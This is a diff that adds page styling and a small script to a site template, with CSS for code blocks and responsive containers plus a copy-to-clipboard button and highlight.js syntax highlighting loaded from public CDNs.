+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+<style>
+
+.copy-button {
+  position: absolute;
+  right: 5px ;
+  top: 5px;
+  border: transparent;
+  background-color: transparent;
+  padding: 2px 6px;
+  cursor: pointer;
+  font-size: 14px;
+  color: #333;
+  border-radius: 8px;
+
+}
+
+.copy-button:hover {
+  background-color: #30363d; # Change this to a different color to create a hover effect
+}
+.material-icons{
+  line-height:1.3;
+  color: #7d8590;
+}
+
+pre {
+  position: relative;
+  # padding: 20px;
+  border: 1px solid #e7ee7;
+  overflow-x: auto; # Remove this line to disable horizontal scrolling
+  font-size: 14px;
+  line-height: 1.5;
+  border-radius: 6px;
+  margin-bottom: 20px;
+
+  # Add these lines to set a fixed width for the code block and wrap long lines
+  #width: 80%;
+  white-space: pre-wrap; 
+}
+
+pre code {
+  display: block;
+  border-radius: 8px;
+  background-color: #2d2d2d; # Change this to a different color to match the copy button background
+
+}
+
+
+
+
+@media only screen and (min-width: 280px) {
+  img {
+    width: 85%; /* Make image smaller on tablets and mobiles */
+  }
+}
+
+@media only screen and (max-width: 768px) {
+  img {
+    width: 85%; /* Make image smaller on tablets and desktops */
+  }
+}
+
+# @media (min-width: 576px) {
+#   img {
+#     max-width: 540px;
+#   }
+# }
+
+# @media (min-width: 768px) {
+#   img {
+#     max-width: 720px;
+#   }
+# }
+
+
+
+@media (min-width: 280px) {
+  .container {
+    max-width: 90%;
+    margin: 0 auto;
+    height: 100%;
+  }
+}
+
+@media (min-width: 750px) {
+  .container {
+    max-width: 80%;
+    margin: 0 auto;
+    height: 100%;
+  }
+}
+
+
+
+@media (min-width: 912px) {
+  .container {
+    max-width: 70%;
+    margin: 0 auto;
+    height: 100%;
+  }
+}
+
+# @media (min-width: 1200px) {
+#   .container {
+#     max-width: 70%;
+#     margin: 0 auto;
+#     height: 100%;
+#   }
+# }
+
+# @media (min-width: 576px) {
+#   .container {
+#     max-width: 540px;
+#   }
+# }
+
+# @media (min-width: 768px) {
+#   .container {
+#     max-width: 620px;
+#     margin: 0;
+#   }
+# }
+
+# @media (min-width: 992px) {
+#   .container {
+#     max-width: 760px;
+#   }
+# }
+
+@media (min-width: 1200px) {
+  .container {
+    max-width: 735px;
+    margin: 0;
+    height: 100%;
+  }
+}
+
+# p { 
+#   text-indent: 10px;
+# }
+
+h2 {
+  font-size: 1.5rem;
+}
+
+h3 {
+  font-size: 1.3rem;
+}
+
+# .container {
+#   max-width: 100%; /* Set the container width to 100% */
+#   padding-left: 15px; /* Add some padding to the left */
+#   padding-right: 15px; /* Add some padding to the right */
+# }
+
+
+</style>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.7.2/highlight.min.js"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/atom-one-dark-reasonable.min.css">
+
+<script>
+  document.addEventListener('DOMContentLoaded', function() {
+    var codeBlocks = document.querySelectorAll('pre code');
+    codeBlocks.forEach(function(codeBlock) {
+      var copyButton = document.createElement('button');
+      copyButton.innerHTML = '<i class="material-icons">content_copy</i>';
+      copyButton.classList.add('copy-button');
+      codeBlock.parentNode.insertBefore(copyButton, codeBlock);
+
+      copyButton.addEventListener('click', function() {
+        var code = codeBlock.textContent;
+        var textarea = document.createElement('textarea');
+        textarea.textContent = code;
+        document.body.appendChild(textarea);
+        textarea.select();
+        document.execCommand('copy');
+        textarea.remove();
+        copyButton.innerHTML = '<i class="material-icons">check</i>';
+        setTimeout(function() {
+          copyButton.innerHTML = '<i class="material-icons">content_copy</i>';
+        }, 2000);
+      });
+    });
+
+    // Initialize highlight.js for syntax highlighting
+    hljs.initHighlightingOnLoad();
+  });
+</script>
